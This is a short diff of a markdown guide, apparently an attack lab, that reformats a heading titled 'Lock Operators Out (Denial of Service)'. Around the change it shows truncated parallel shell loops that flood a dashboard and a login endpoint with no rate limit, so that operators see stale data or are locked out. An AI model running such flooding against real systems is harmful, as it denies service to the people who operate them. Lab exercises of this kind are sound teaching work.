@@ -187,8 +187,9 @@ seq 1 500 | xargs -I{} -P 20 sh -c \
 
 - Watch the dashboard, values freeze/loop, operators see **stale data**
 
+<hr>
 
-### Part C - Lock Operators Out (Denial of Service)
+## Part C - Lock Operators Out (Denial of Service)
 - Spam ``/login`` (weak, no rate limit)
 ```bash
 seq 1 1000 | xargs -I{} -P 50 sh -c \
